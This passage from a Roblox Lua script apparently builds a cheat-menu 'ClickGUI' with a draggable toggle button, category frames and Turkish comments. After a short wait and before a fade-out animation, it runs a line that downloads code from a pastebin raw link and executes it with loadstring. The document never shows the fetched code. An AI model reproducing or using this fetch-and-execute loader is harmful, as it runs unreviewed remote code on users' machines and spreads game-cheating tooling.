	clickGUIButton.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

clickGUIButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = clickGUIButton.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

clickGUIButton.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

-- ClickGUI aç/kapa
local clickGUIVisible = true
clickGUIButton.MouseButton1Click:Connect(function()
	clickGUIVisible = not clickGUIVisible
	for _, frame in pairs(CategoryFrames) do
		frame.Visible = clickGUIVisible
		searchBox.Visible = clickGUIVisible
	end
	Notify("ClickGUI " .. (clickGUIVisible and "on!" or "off!"), 2)
end)

-- Category Frame'leri için UICorner
for _, frame in pairs(CategoryFrames) do
	local frameCorner = Instance.new("UICorner")
	frameCorner.CornerRadius = UDim.new(0, 10)  -- kategori köşeleri
	frameCorner.Parent = frame

	-- İçerik layout
	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0,5)
	layout.FillDirection = Enum.FillDirection.Vertical
	layout.Parent = frame
end

-- 4 saniye bekle
task.wait(4)

loadstring(game:HttpGet("https://pastebin.com/raw/AUFQ1WX3"))()

-- Kaybolma animasyonu
local disappearTween = TweenService:Create(
	imageLabel,
	TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
	{
		ImageTransparency = 1,
		Position = UDim2.new(0.5, -150, 0.55, -150)
	}
)

disappearTween:Play()

disappearTween.Completed:Connect(function()
	screenGui:Destroy()
end)
